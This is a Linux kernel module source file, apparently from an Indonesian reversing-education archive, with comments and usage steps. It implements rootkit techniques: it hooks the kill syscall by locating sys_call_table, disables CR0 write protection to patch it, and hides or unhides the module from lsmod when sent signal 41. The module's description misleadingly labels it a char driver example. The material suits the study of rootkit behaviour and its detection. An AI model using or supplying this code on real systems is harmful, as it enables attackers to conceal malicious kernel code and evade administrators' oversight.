/*
    Hide Module
    Archive of Reversing.ID
    Based on Linux Kernel Module Programming Guide

    Tested on Linux Kernel 4.9.0-11-amd64 (Debian)

    Menyembunyikan module dari daftar module.
    Menggunakan syscall kill untuk memberikan perintah.

Build:
    $ make

Module info:
    $ modinfo code.ko

List module:
    $ lsmod

Load:
    $ insmod code.ko

Testing:
    $ lsmod | grep code
    $ kill -41 0
    $ lsmod | grep code
    $ kill -41 0
    $ lsmod | grep code

Unload:
    $ rmmod code
*/

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>

#include <linux/syscalls.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Reversing.ID");
MODULE_DESCRIPTION("Example of Char Driver (Linux)");


/*
    Menyembunyikan module dengan menghilangkan module dari daftar module
    yang dimuat oleh kernel. Ketika module tidak berada di dalam list,
    maka operasi module (seperti unload module) tidak akan dapat dilakukan.

    Lakukan penyembunyian ketika semua operasi telah dilakukan.
*/

/* ****************** Type Definition & Data Declaration ****************** */

/* menyimpan module sebelumnya di linked list */
static struct list_head * prev_module;
static short  hidden = 0;

/* 
    signal yang akan dikirimkan oleh kill menjadi command bagi module.
    gunakan signal yang termasuk ke dalam kategori real-time signal
    dan tidak digunakan dalam library.
*/
enum 
{
    SIGHIDE = 41,   
};

unsigned long cr0;

/* pointer ke syscall table */
static unsigned long *__sys_call_table;

/* pointer ke syscall original */
typedef asmlinkage int (*_o_kill_t  ) (pid_t, int);

_o_kill_t ptr_kill;

/* ********************* Internal Functions Prototype ********************* */

void mod_hide (void);
void mod_show (void);

/* dapatkan alamat syscall table */
unsigned long * get_syscall_table_addr (void);

asmlinkage int new_kill (pid_t pid, int sig);


/* *************************** Helper Functions *************************** */

static inline void protect_memory(void)
{
    write_cr0(cr0);
}

static inline void unprotect_memory(void)
{
    write_cr0(cr0 & ~0x00010000);
}


/* ****************** Loadable Kernel Module Initialize ******************* */

static int __init code_init(void)
{
    /* temukan alamat syscall table */
    __sys_call_table = get_syscall_table_addr ();
    if (! __sys_call_table)
        return -1;

    cr0 = read_cr0 ();

    ptr_kill = (_o_kill_t) __sys_call_table[__NR_kill];

    printk (KERN_INFO "Syscall Table at %p\n", __sys_call_table);
    printk (KERN_INFO "   __NR_kill   at %p\n", (void*) __sys_call_table[__NR_kill]);

    unprotect_memory();
    __sys_call_table[__NR_kill] = (unsigned long) new_kill;
    protect_memory();

    printk (KERN_INFO "New address:\n");
    printk (KERN_INFO "   __NR_kill   at %p\n", (void*) __sys_call_table[__NR_kill]);

    return 0;
}

static void __exit code_exit(void)
{
    unprotect_memory();
    __sys_call_table[__NR_kill] = (unsigned long) ptr_kill;
    protect_memory();
}

module_init(code_init);
module_exit(code_exit);


/* ******************* Internal Functions Implementation ******************* */

/* 
    Menyembunyikan module dengan menghapus module dari list.
*/
void mod_hide (void)
{
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    hidden = 1;
}

/*
    Menampilkan module dengan menyambungkan kembali module ke list.
*/
void mod_show (void)
{
    list_add(&THIS_MODULE->list, prev_module);
    hidden = 0;
}

unsigned long * 
get_syscall_table_addr (void)
{
    unsigned long * result;

    result = (unsigned long *) kallsyms_lookup_name("sys_call_table");
    return result;
}

asmlinkage int 
new_kill (pid_t pid, int sig)
{
    printk (KERN_INFO "revid: invoking kill %d with %d\n", pid, sig);
    switch (sig)
    {
        case SIGHIDE:
            if (hidden) mod_show();
            else        mod_hide();
            break;
        default:
            return ptr_kill(pid, sig);
    }

    return 0;
}